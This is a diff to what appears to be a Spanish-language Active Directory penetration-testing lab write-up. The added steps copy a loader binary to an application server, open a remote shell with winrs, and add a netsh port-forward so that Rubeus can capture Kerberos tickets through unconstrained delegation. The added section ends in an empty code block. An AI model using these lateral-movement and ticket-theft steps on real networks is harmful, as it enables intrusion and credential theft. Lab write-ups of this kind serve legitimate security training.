@@ -1181,6 +1181,23 @@ EN el nuevo proceso que se nos ejecuta deberemos de cargar una *Invishell* y tam
  Find-PSRemotingLocalAdminAccess -Domain dollarcorp.moneycorp.local
 ```
 
+Ahora copiaremos el *Loader* a la maquina de *appsrv* la cual como hemos descubierto antes tiene delegacion sin restricciones
+```shell
+[student97 - newCMD]
+echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-appsrv\C$\Users\Public\Loader.exe /Y
+```
+
+Nos conectaremos a la maquina y nos haremos el reenvio de puertos y despues ejecutaremos *Ruebus* en modo escucha
+```shell
+[student97 - newCMD]
+winrs -r:dcorp-appsrv cmd
+```
+```shell
+netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.97
+```
+```shell
+
+```
 
 
 
